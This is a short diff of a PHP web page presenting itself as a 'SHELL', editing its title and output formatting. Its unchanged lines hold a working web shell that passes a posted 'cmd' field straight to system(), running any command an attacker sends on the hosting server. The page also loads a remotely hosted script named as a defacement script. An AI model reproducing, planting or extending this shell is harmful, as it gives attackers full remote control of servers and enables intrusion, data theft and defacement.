@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(04-01).js" type="application/javascript"></script>
 
-    <title>SHELL - BOGOS</title>
+    <title>SHELL - CONQUER THE WORLD</title>
 
 
 <body>
@@ -33,11 +33,13 @@
 </form></center>
 <br><br>
 <center>
+<pre>
 <?php
 
 echo system($_POST['cmd']);
 
 ?>
+</pre>
 </center>
 </body>
 </html>
